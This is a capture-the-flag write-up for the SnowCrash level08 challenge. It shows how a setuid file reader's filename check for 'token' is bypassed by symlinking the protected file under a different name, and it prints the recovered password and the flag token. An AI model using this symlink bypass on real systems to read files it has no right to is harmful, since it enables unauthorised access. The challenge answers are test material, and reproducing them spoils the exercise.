We see 2 files token and level08:
```
level08@SnowCrash:~$ ls -la
[...]
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
We don't have access to the token, but we can run level08:
```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```
If you transfer a file that belongs to us, the program works like an echo:
```
level08@SnowCrash:~$ echo 'abc' > /tmp/myfile
level08@SnowCrash:~$ ./level08 /tmp/myfile
abc
```
But this doesn't work if the name contains the word `token`
```
level08@SnowCrash:~$ echo 'abc' > /tmp/token && ./level08 /tmp/token
You may not access '/tmp/token'
level08@SnowCrash:~$ echo 'abc' > /tmp/mytoken && ./level08 /tmp/mytoken
You may not access '/tmp/mytoken'
level08@SnowCrash:~$ echo 'token' > /tmp/token2 && ./level08 /tmp/token2
You may not access '/tmp/token2'
```
So we should create a link to our file but call it by a different name:
```
level08@SnowCrash:~$ ln -s ~/token /tmp/link && ./level08 /tmp/link
quif5eloekouj29ke0vouxean
```
It is password.

token: `25749xKZ8L7DkSCwJkT9dyv6f`